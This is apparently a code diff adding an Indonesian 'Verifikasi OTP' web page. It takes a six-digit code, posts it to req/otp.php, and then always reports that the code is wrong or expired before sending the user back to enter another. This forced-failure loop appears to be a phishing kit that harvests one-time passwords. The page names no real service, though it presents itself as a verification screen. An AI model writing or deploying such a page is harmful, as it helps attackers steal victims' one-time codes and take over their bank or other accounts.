@@ -1,0 +1,131 @@
+<!DOCTYPE html><html lang="id"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi OTP</title>
+<style>
+body { margin:0; font-family:sans-serif; text-align:center; background:#FFFFFF; }
+.container { max-width:400px; margin:auto; padding:20px; }
+
+/* ===== Marquee ===== */
+.marquee { background:#FFFFF; color:#fff; padding:8px 0; white-space:nowrap; overflow:hidden; }
+.marquee span { display:inline-block; padding-left:100%; animation:marquee 15s linear infinite; }
+@keyframes marquee { 0% {transform:translateX(0);} 100% {transform:translateX(-100%);} }
+
+/* ===== Slider Gambar ===== */
+.slider { overflow:hidden; width:100%; margin:20px 0; background:#fff; }
+.slider-track { display:flex; width:max-content; animation:scroll 20s linear infinite; }
+.slider-track img { width:80px; height:80px; margin:10px; border-radius:10px; }
+@keyframes scroll { 0% {transform:translateX(0);} 100% {transform:translateX(-50%);} }
+
+/* ===== Gambar OTP ===== */
+.otp-image img { width:200px; height:auto; border-radius:12px; margin:10px 0 20px; }
+
+/* ===== Input OTP ===== */
+.otp-box { display:flex; justify-content:space-between; margin:20px 0; }
+.otp-box input { width:45px; height:50px; font-size:24px; text-align:center; border:2px solid #ccc; border-radius:8px; }
+
+/* ===== Tombol ===== */
+button { width:100%; padding:13px; background:#0000FF; color:#FFFFFF; border:none; border-radius:13px; cursor:pointer; }
+
+/* ===== Countdown ===== */
+#countdown { color:#000000; margin:10px 0; }
+
+/* ===== Overlay ===== */
+#overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); justify-content:center; align-items:center; flex-direction:column; z-index:100; }
+.spinner { border:8px solid rgba(255,255,255,0.3); border-top:8px solid #FFFFFF; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin-bottom:20px; }
+@keyframes spin { 0%{transform:rotate(0);}100%{transform:rotate(360deg);} }
+#overlay-text { color:#FFFFFF; font-size:20px; font-weight:bold; }
+#overlay-text.sukses { color:red; }
+</style>
+</head>
+<body>
+
+<!-- Marquee -->
+
+
+<!-- Slider -->
+  </div>
+</div>
+
+<!-- Form OTP -->
+<div class="container">
+  <h2>Verifikasi OTP</h2>
+  <div class="otp-image"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwjbAUNC4HffhmSnLeVAxfZ3S8a5F13NKCama0lnb8UDLzlQvLXMfJaALOnlHxj44ygGQNIwSrcFWp85gp518TcMUPf4ilqKf2CBER4zrYdknAW7OgLc3D_OtzKwRNnPUW2paStB1bGaVnEC_zjLyMBI6u8aElhKFKb8mSZPc66JAPBrsXTB0CxTf9PzuR/s720/1000240341.jpg" alt="Logo OTP"></div>
+  <form id="form-otp">
+    <div class="otp-box">
+      <input type="tel" maxlength="1" required="">
+      <input type="tel" maxlength="1" required="">
+      <input type="tel" maxlength="1" required="">
+      <input type="tel" maxlength="1" required="">
+      <input type="tel" maxlength="1" required="">
+      <input type="tel" maxlength="1" required="">
+    </div>
+    <input type="hidden" name="otp" id="gabunganOtp">
+    <p id="countdown">Waktu sisa: <span id="timer">60</span> detik</p>
+    <button type="submit" id="btn-otp" disabled="">Lanjut</button>
+  </form>
+</div>
+
+<!-- Overlay -->
+<div id="overlay">
+  <div class="spinner"></div>
+  <div id="overlay-text">Sedang memproses...</div>
+</div>
+
+<script>
+// ===== OTP Input =====
+const inputs = document.querySelectorAll('.otp-box input');
+const hidden = document.getElementById('gabunganOtp');
+const btn = document.getElementById('btn-otp');
+const timerSpan = document.getElementById('timer');
+let waktu = 60;
+
+inputs.forEach((inp, idx)=>{
+  inp.addEventListener('input', ()=>{
+    inp.value = inp.value.replace(/\D/g,'').slice(0,1);
+    if(inp.value && idx<inputs.length-1) inputs[idx+1].focus();
+    hidden.value = Array.from(inputs).map(i=>i.value).join('');
+    btn.disabled = hidden.value.length!==6;
+  });
+});
+
+// ===== Countdown Timer =====
+let interval = setInterval(()=>{
+  waktu--;
+  timerSpan.textContent = waktu;
+  if(waktu<=0){ clearInterval(interval); btn.disabled=true; }
+},1000);
+
+// ===== Submit + Loading AJAX =====
+document.getElementById('form-otp').addEventListener('submit', e=>{
+  e.preventDefault();
+  const overlay = document.getElementById('overlay');
+  const overlayText = document.getElementById('overlay-text');
+
+  const otpValue = hidden.value;
+
+  // Kirim OTP ke server via fetch
+  fetch('req/otp.php', {
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'otp='+encodeURIComponent(otpValue)
+  })
+  .then(resp=>resp.text())
+  .then(data=>{
+    // Tampilkan overlay setelah server merespons
+    overlay.style.display='flex';
+    overlayText.classList.add('sukses');
+    overlayText.textContent='❌OTP Tidak Sesuai Atau Kadaluarsa input kode yang terbaru!';
+
+    setTimeout(()=>{ window.location.href='otp.html'; },1500);
+  })
+  .catch(err=>{ alert('Terjadi kesalahan: '+err); });
+});
+</script>
+
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f939d91549964c63adf229f7b3292e5e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b4c020ed473e4807af5b20aa71d5ad66","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"2cc67fee6c5545b58e484649fa15e5af","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"90953e11956b44b6aa0fbdd91c666191","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body></html>
